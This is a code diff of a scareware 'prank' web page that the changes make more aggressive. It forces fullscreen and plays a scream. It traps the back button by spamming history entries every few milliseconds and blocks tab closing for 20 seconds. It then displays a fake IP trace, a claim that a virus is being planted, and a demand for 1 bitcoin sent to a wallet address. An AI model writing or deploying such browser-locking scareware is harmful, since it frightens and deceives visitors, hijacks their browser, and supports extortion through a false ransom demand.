@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
     <title></title>
     <style>
         html, body { margin:0; padding:0; height:100%; overflow:hidden; background:#000; }
@@ -45,7 +46,7 @@
     <audio id="scream" src="https://www.myinstants.com/media/sounds/scary-maze-game-scream.mp3"></audio>
 
     <script>
-        // Force fullscreen
+        // MULTIPLE FULLSCREEN + ADDRESS BAR HIDE
         function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
@@ -53,7 +54,12 @@
             else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
         enterFullscreen();
-        window.onload = enterFullscreen;
+        setTimeout(enterFullscreen, 500);
+        setTimeout(enterFullscreen, 1000);
+        window.onload = () => {
+            setTimeout(() => window.scrollTo(0, 1), 100);
+            enterFullscreen();
+        };
 
         const ambience = document.getElementById('ambience');
         const scream = document.getElementById('scream');
@@ -62,38 +68,56 @@
         ambience.volume = 0.8;
         ambience.play();
 
-        // Maximum 20-second back trap
+        // DEEPEST 20-SECOND BACK + CLOSE TRAP
         let trapActive = true;
-        for (let i = 0; i < 50; i++) history.pushState({}, '', location.href);
+
+        // Flood with 100 dummy entries
+        for (let i = 0; i < 100; i++) {
+            history.pushState({}, '', location.href);
+        }
+
+        // Ultra-fast spam
         const trapInterval = setInterval(() => {
             if (trapActive) {
                 history.pushState({}, '', location.href);
                 history.pushState({}, '', location.href);
+                history.pushState({}, '', location.href);
             }
-        }, 10);
+        }, 5);
+
+        // Counter any back attempt
         window.onpopstate = function() {
             if (trapActive) {
-                history.pushState({}, '', location.href);
                 history.go(1);
+                history.pushState({}, '', location.href);
             }
         };
+
+        // Make closing tab harder
+        window.addEventListener('beforeunload', function(e) {
+            if (trapActive) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
+        // Unlock after 20 seconds
         setTimeout(() => {
             trapActive = false;
             clearInterval(trapInterval);
             window.onpopstate = null;
         }, 20000);
 
-        // Fake weird wallet
-        const weirdWallet = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"; // looks real but random
+        // Weird wallet
+        const weirdWallet = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
 
-        // Fake IP & location
+        // Fake IP
         function generateFakeIP() {
             return Math.floor(Math.random() * 255 + 1) + '.' +
                    Math.floor(Math.random() * 256) + '.' +
                    Math.floor(Math.random() * 256) + '.' +
                    Math.floor(Math.random() * 256);
         }
-        const fakeLocations = ["New York, USA", "London, UK", "Moscow, Russia", "Beijing, China", "Unknown Location", "Your Bedroom", "Hidden Basement", "Your Exact Coordinates"];
 
         function typeLine(text, delay = 70, fast = false) {
             return new Promise(resolve => {
@@ -101,7 +125,7 @@
                 const div = document.createElement('div');
                 div.classList.add('glitch');
                 output.appendChild(div);
-                const speed = fast ? 20 : delay; // fast = 20ms per char
+                const speed = fast ? 20 : delay;
                 const interval = setInterval(() => {
                     div.textContent += text[i];
                     i++;
@@ -116,15 +140,13 @@
         async function startPrank() {
             await typeLine("TRACING YOUR IP ADDRESS...", 70, true);
             await typeLine("IP FOUND: " + generateFakeIP(), 70, true);
-            await typeLine("LOCATION DETECTED: " + fakeLocations[Math.floor(Math.random() * fakeLocations.length)], 70, true);
+            await typeLine("LOCATION DETECTED: Philippines", 70, true);
             await typeLine("YOU CAN BACK THIS WEBSITE BUT YOU CAN'T EVER DELETE THIS VIRUS I'M PLANTING IN YOUR DEVICE", 70, true);
             await typeLine("IF YOU WANT IT TO BE REMOVED THEN PAY 1 BITCOIN", 70, true);
             await typeLine("TO: " + weirdWallet, 70, true);
 
-            // Wait 7 seconds
             await new Promise(r => setTimeout(r, 7000));
 
-            // Normal speed hack messages
             await typeLine("YOU HAVE BEEN HACKED");
             await typeLine("I HAVE ALL YOUR INFORMATION");
             await typeLine("AND ALL OF YOUR ACCOUNTS");
